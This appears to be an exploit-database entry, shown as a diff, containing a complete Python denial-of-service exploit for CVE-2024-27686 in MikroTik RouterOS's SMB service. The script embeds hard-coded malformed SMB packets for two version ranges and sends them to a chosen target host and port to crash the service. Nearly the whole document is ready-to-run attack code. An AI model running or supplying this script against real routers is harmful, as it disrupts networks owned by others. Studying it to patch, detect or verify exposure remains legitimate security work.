@@ -1,0 +1,103 @@
+id: 39495
+date: 03/29/2024
+title: RouterOS 6.40.5 - 6.44 and 6.48.1 - 6.49.10 - Denial of Service Exploit
+author: ice-wzl
+cves: CVE-2024-27686
+
+# Exploit Title: CVE-2024-27686: RouterOS-SMB-DOS
+# Exploit Author: ice-wzl, Solstice Cyber Solutions
+# Vendor Homepage: https://mikrotik.com/
+# Software Link: https://mikrotik.com/download/archive
+# Version: RouterOS devices ranging from 6.40.5 - 6.44 and 6.48.1 - 6.49.10
+# Tested on: RouterOS 6.40.5 - 6.44 and 6.48.1 - 6.49.10
+# CVE : CVE-2024-27686
+#!/usr/bin/python3 
+# Founded by ice-wzl in conjunction with Solstice Cyber Solutions
+import argparse
+import sys
+import socket 
+# Define the packets
+
+# the packet that causes crash 6.40.5 - 6.42.3
+fuzzed_packet_6 = b'\x00\x00\x00n\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x03\x00\xf1\x1f\x08\x00\x00\x00\x00\x00\x00\xe1\xbe\x82\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00G\xe5\x07\xf5\x07\xec\x01u\xe4Q]\x9e\xea\xedn\xa9\t\x00\x00\x00H\x00&\x00\\\x00\\\x001\x009\x002\x00.\x001\x006\x008\x00.\x001\x005\x00.\x007\x007\x00\\\x00p\x00u\x00b\x00'
+
+
+packet_0 = b'\x00\x00\x00\xea\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x05\x00\x01\x00\x00\x00\x7f\x00\x00\x00\xe8\xe4*\x99\xc9\xeb\xb6E\xa2A\xe9(\xee%\xe5\xdfp\x00\x00\x00\x04\x00\x00\x00\x02\x02\x10\x02\x00\x03\x02\x03\x11\x03\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00_\xf7m\xf2h*\x8f\x8ae\x0f8+T=Na8_\x0b@C\x82\xe7\x87\xc3qZ\xd7\xcf0M\x87\x00\x00\x02\x00\n\x00\x00\x00\x00\x00\x04\x00\x02\x00\x01\x00\x04\x00\x03\x00\x00\x00\x00\x00\x00\x00\x08\x00\x08\x00\x00\x00\x00\x00\x03\x00\x02\x00\x01\x00\x00\x00\x05\x00\x1a\x00\x00\x00\x00\x001\x009\x002\x00.\x001\x006\x008\x00.\x001\x005\x00.\x008\x004\x00'
+packet_2_fuzzed = b'\x00\x00\x00\xa2\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x19\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00X\x00J\x00\x00\x00\x00\x00\x00\x00\x00\x00`H\x05\x06+\x06\x01\x05\x05\x02\xa0>0<\xa0\x0e21540373\xed\xba\xad211\x0c\x06\n+\x06\x01\x04\x01\x82294517887446830\x02\x02\n\xa2*\x04(NTLMSSP\x00\x01\x00\x00\x00\x15\x82\x08b\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x06\x01\x00\x00\x00\x00\x00\x0f'
+
+
+def open_connection(ip, port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s.connect((ip, port))
+        return s
+    except ConnectionRefusedError:
+        print(f"[!] Connection Refused on: {ip} {port}")
+        sys.exit(2)
+
+def send_payload_high(s):
+    s.send(packet_0)
+    s.send(packet_2_fuzzed)
+    s.close()
+
+def send_payload_low(s):
+    s.send(fuzzed_packet_6)
+    s.close()
+
+def verify_input(user_inp):
+    try:
+        user_inp = int(user_inp)
+        if user_inp > 2 or user_inp < 1:
+            return 3
+        else:
+            return user_inp
+    except ValueError:
+        return 0
+
+if __name__ == '__main__':
+
+    parser = argparse.ArgumentParser(prog='SMB Crash',
+        description='Crashes Mikrotik RouterOS SMB Service 6.40.5 - 6.49.10',
+        epilog='Discovered by: ice-wzl')
+
+    parser.add_argument("-t", "--target", action="store", dest="target")
+    parser.add_argument("-p", "--port", action="store", dest="port")
+
+    args = parser.parse_args()
+    
+    if not args.target or not args.port:
+        print(f"[+] python3 {sys.argv[0]} --help")
+        sys.exit(1)
+
+    print("[+] What version is the target:\n\t[1] 6.40.5 - 6.44\n\t[2] 6.48.1 - 6.49.10\nEnter 1 or 2:")
+    version_choice = input("--> ")
+
+    if verify_input(version_choice) == 0:
+        print("Please enter a number...")
+        sys.exit(3)
+    elif verify_input(version_choice) == 3:
+        print("Please enter a number between 1 and 2")
+        sys.exit(4)
+
+    if verify_input(version_choice) == 1:
+        if args.port:
+            get_connect = open_connection(args.target, int(args.port))
+            send_payload_low(get_connect)
+            print(f"[+] Sent DOS to {args.target} on {args.port}")
+        else:
+            get_connect = open_connection(args.target, 445)
+            send_payload_low(get_connect)
+            print(f"[+] Sent DOS to {args.target} on 445")  
+    
+    if verify_input(version_choice) == 2:
+        if args.port:
+            get_connect = open_connection(args.target, int(args.port))
+            send_payload_high(get_connect)
+            print(f"[+] Sent DOS to {args.target} on {args.port}")
+
+        else:
+            get_connect = open_connection(args.target, 445)
+            send_payload_high(get_connect)
+            print(f"[+] Sent DOS to {args.target} on 445")
+
+#  0day.today [2024-04-02]  #
